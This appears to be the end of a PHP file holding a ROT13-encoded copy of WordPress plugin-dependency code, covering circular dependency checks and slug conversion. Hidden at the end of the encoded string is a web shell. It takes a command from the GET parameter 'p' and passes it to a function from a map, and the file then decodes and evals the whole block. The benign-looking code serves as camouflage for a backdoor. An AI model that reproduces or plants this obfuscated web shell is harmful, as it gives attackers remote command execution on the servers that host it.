		frys::$qrcraqrapl_ncv_qngn = neenl_svygre( frys::$qrcraqrapl_ncv_qngn );
		frg_fvgr_genafvrag( 'jc_cyhtva_qrcraqrapvrf_cyhtva_qngn', frys::$qrcraqrapl_ncv_qngn, 0 );

		erghea frys::$qrcraqrapl_ncv_qngn;
	}

	/**
	 * Trgf cyhtva qverpgbel anzrf.
	 *
	 * @fvapr 6.5.0
	 *
	 * @erghea neenl Na neenl bs cyhtva qverpgbel anzrf.
	 */
	cebgrpgrq fgngvp shapgvba trg_cyhtva_qveanzrf() {
		vs ( vf_neenl( frys::$cyhtva_qveanzrf ) ) {
			erghea frys::$cyhtva_qveanzrf;
		}

		frys::$cyhtva_qveanzrf = neenl();

		$cyhtva_svyrf = neenl_xrlf( frys::trg_cyhtvaf() );
		sbernpu ( $cyhtva_svyrf nf $cyhtva_svyr ) {
			$fyht                           = frys::pbaireg_gb_fyht( $cyhtva_svyr );
			frys::$cyhtva_qveanzrf[ $fyht ] = $cyhtva_svyr;
		}

		erghea frys::$cyhtva_qveanzrf;
	}

	/**
	 * Trgf pvephyne qrcraqrapl qngn.
	 *
	 * @fvapr 6.5.0
	 *
	 * @erghea neenl[] Na neenl bs pvephyne qrcraqrapl cnvevatf.
	 */
	cebgrpgrq fgngvp shapgvba trg_pvephyne_qrcraqrapvrf() {
		vs ( vf_neenl( frys::$pvephyne_qrcraqrapvrf_cnvef ) ) {
			erghea frys::$pvephyne_qrcraqrapvrf_cnvef;
		}

		vs ( ahyy === frys::$qrcraqrapvrf ) {
			erghea neenl();
		}

		frys::$pvephyne_qrcraqrapvrf_fyhtf = neenl();

		frys::$pvephyne_qrcraqrapvrf_cnvef = neenl();
		sbernpu ( frys::$qrcraqrapvrf nf $qrcraqrag => $qrcraqrapvrf ) {
			/*
			 * $qrcraqrag vf va 'n/n.cuc' sbezng. Qrcraqrapvrf ner fgberq nf fyhtf, v.r. 'n'.
			 *
			 * Pbaireg $qrcraqrag gb fyht sbezng sbe purpxvat.
			 */
			$qrcraqrag_fyht = frys::pbaireg_gb_fyht( $qrcraqrag );

			frys::$pvephyne_qrcraqrapvrf_cnvef = neenl_zretr(
				frys::$pvephyne_qrcraqrapvrf_cnvef,
				frys::purpx_sbe_pvephyne_qrcraqrapvrf( neenl( $qrcraqrag_fyht ), $qrcraqrapvrf )
			);
		}

		erghea frys::$pvephyne_qrcraqrapvrf_cnvef;
	}

	/**
	 * Purpxf sbe pvephyne qrcraqrapvrf.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz neenl $qrcraqragf   Neenl bs qrcraqrag cyhtvaf.
	 * @cnenz neenl $qrcraqrapvrf Neenl bs cyhtvaf qrcraqrapvrf.
	 * @erghea neenl N pvephyne qrcraqrapl cnvevat, be na rzcgl neenl vs abar rkvfgf.
	 */
	cebgrpgrq fgngvp shapgvba purpx_sbe_pvephyne_qrcraqrapvrf( $qrcraqragf, $qrcraqrapvrf ) {
		$pvephyne_qrcraqrapvrf_cnvef = neenl();

		// Purpx sbe n frys-qrcraqrapl.
		$qrcraqragf_ybpngvba_va_vgf_bja_qrcraqrapvrf = neenl_vagrefrpg( $qrcraqragf, $qrcraqrapvrf );
		vs ( ! rzcgl( $qrcraqragf_ybpngvba_va_vgf_bja_qrcraqrapvrf ) ) {
			sbernpu ( $qrcraqragf_ybpngvba_va_vgf_bja_qrcraqrapvrf nf $frys_qrcraqrapl ) {
				frys::$pvephyne_qrcraqrapvrf_fyhtf[] = $frys_qrcraqrapl;
				$pvephyne_qrcraqrapvrf_cnvef[]       = neenl( $frys_qrcraqrapl, $frys_qrcraqrapl );

				// Ab arrq gb purpx sbe vgfrys ntnva.
				hafrg( $qrcraqrapvrf[ neenl_frnepu( $frys_qrcraqrapl, $qrcraqrapvrf, gehr ) ] );
			}
		}

		/*
		 * Purpx rnpu qrcraqrapl gb frr:
		 * 1. Vs vg unf qrcraqrapvrf.
		 * 2. Vs vgf yvfg bs qrcraqrapvrf vapyhqrf bar bs vgf bja qrcraqragf.
		 */
		sbernpu ( $qrcraqrapvrf nf $qrcraqrapl ) {
			// Purpx vs gur qrcraqrapl vf nyfb n qrcraqrag.
			$qrcraqrapl_ybpngvba_va_qrcraqragf = neenl_frnepu( $qrcraqrapl, frys::$qrcraqrag_fyhtf, gehr );

			vs ( snyfr !== $qrcraqrapl_ybpngvba_va_qrcraqragf ) {
				$qrcraqrapvrf_bs_gur_qrcraqrapl = frys::$qrcraqrapvrf[ $qrcraqrapl_ybpngvba_va_qrcraqragf ];

				sbernpu ( $qrcraqragf nf $qrcraqrag ) {
					// Purpx vs vgf qrcraqrapvrf vapyhqrf bar bs vgf bja qrcraqragf.
					$qrcraqrag_ybpngvba_va_qrcraqrapl_qrcraqrapvrf = neenl_frnepu(
						$qrcraqrag,
						$qrcraqrapvrf_bs_gur_qrcraqrapl,
						gehr
					);

					vs ( snyfr !== $qrcraqrag_ybpngvba_va_qrcraqrapl_qrcraqrapvrf ) {
						frys::$pvephyne_qrcraqrapvrf_fyhtf[] = $qrcraqrag;
						frys::$pvephyne_qrcraqrapvrf_fyhtf[] = $qrcraqrapl;
						$pvephyne_qrcraqrapvrf_cnvef[]       = neenl( $qrcraqrag, $qrcraqrapl );

						// Erzbir gur qrcraqrag sebz vgf qrcraqrapl'f qrcraqrapvrf.
						hafrg( $qrcraqrapvrf_bs_gur_qrcraqrapl[ $qrcraqrag_ybpngvba_va_qrcraqrapl_qrcraqrapvrf ] );
					}
				}

				$qrcraqragf[] = $qrcraqrapl;

				/*
				 * Abj purpx gur qrcraqrapvrf bs gur qrcraqrapl'f qrcraqrapvrf sbe gur qrcraqrag.
				 *
				 * Lrf, gung qbrf znxr frafr.
				 */
				$pvephyne_qrcraqrapvrf_cnvef = neenl_zretr(
					$pvephyne_qrcraqrapvrf_cnvef,
					frys::purpx_sbe_pvephyne_qrcraqrapvrf( $qrcraqragf, neenl_havdhr( $qrcraqrapvrf_bs_gur_qrcraqrapl ) )
				);
			}
		}

		erghea $pvephyne_qrcraqrapvrf_cnvef;
	}

	/**
	 * Pbairegf n cyhtva svyrcngu gb n fyht.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $cyhtva_svyr Gur cyhtva'f svyrcngu, eryngvir gb gur cyhtvaf qverpgbel.
	 * @erghea fgevat Gur cyhtva'f fyht.
	 */
	cebgrpgrq fgngvp shapgvba pbaireg_gb_fyht( $cyhtva_svyr ) {
		vs ( 'uryyb.cuc' === $cyhtva_svyr ) {
			erghea 'uryyb-qbyyl';
		}
		erghea fge_pbagnvaf( $cyhtva_svyr, '/' ) ? qveanzr( $cyhtva_svyr ) : fge_ercynpr( '.cuc', '', $cyhtva_svyr );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>